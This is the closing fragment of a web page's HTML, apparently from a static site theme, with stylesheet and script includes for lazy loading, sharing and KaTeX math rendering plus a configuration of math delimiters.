                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
